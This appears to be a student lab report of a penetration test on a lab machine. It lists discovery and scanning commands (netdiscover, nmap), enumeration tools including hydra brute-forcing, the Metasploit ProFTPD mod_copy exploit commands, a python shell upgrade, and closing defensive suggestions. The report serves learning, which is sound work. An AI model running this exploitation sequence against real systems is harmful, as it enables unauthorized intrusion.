**Date:02 June 2025
**Subject:** Cybersecurity Lab – Penetration Testing Project Report

---

## 📌 Objective

The objective of this project is to learn practical penetration testing using open-source tools. The tasks include scanning and identifying open ports using Nmap, finding vulnerabilities, exploiting them using Metasploit, gaining shell access, and documenting the entire process like a real-world penetration test report.

## 🔍 IP Discovery

* **Tool Used:** `netdiscover`
* **Command:**

  ```
  netdiscover -r 192.168.56.0/24
  ```
* **Result:** Target machine discovered with IP address `192.168.56.101`

---

## 📡 Nmap Scan Results

* **Command:**

  ```
  nmap -sC -sV -oN basicpentest_nmap.txt 192.168.56.101
  ```
* **Findings:**

  * Port 21/tcp open – FTP (ProFTPD)
  * Port 22/tcp open – SSH (OpenSSH)
  * Port 80/tcp open – HTTP (Apache)

---

## 🔐 Enumeration Outputs

* **Tools Used:**

  * `nikto` (web vulnerability scanning)
  * `enum4linux` (SMB enumeration)
  * `hydra` (brute-force login attempts)

* **Findings:**

  * `nikto`: Detected potential vulnerabilities and default web files.
  * `enum4linux`: Listed SMB shares and user accounts.
  * `hydra`: Attempted brute-force login on FTP and SSH services.

---

## 💣 Exploitation Steps

* **Metasploit Module Used:**

  ```
  exploit/unix/ftp/proftpd_modcopy_exec
  ```

* **Commands Used:**

  ```
  msfconsole
  use exploit/unix/ftp/proftpd_modcopy_exec
  set RHOSTS 192.168.56.101
  set RPORT 21
  run
  ```

* **Result:** Gained shell access through ProFTPD vulnerability.

---

## 🐚 Post-Exploitation

* **Shell Upgraded Using:**

  ```
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```

* **Commands Executed:**

  ```
  whoami
  id
  uname -a
  ```

* **Flag Captured:**
  Found in `/home/user/flag.txt`
  *(Insert flag content here)*

## 🧠 Lessons Learned

* Learned to effectively use scanning and enumeration tools such as Nmap, Nikto, and Enum4linux.
* Understood how Metasploit modules work and how to select the right one for exploitation.
* Gained experience in post-exploitation tasks including shell upgrade and privilege checking.
* Improved documentation skills for penetration testing reports.

---

## 🛡️ Defense Suggestions

* Disable unused services such as FTP.
* Regularly update and patch vulnerable services.
* Enforce strong password policies and account lockouts.
* Implement proper firewall rules and logging mechanisms.
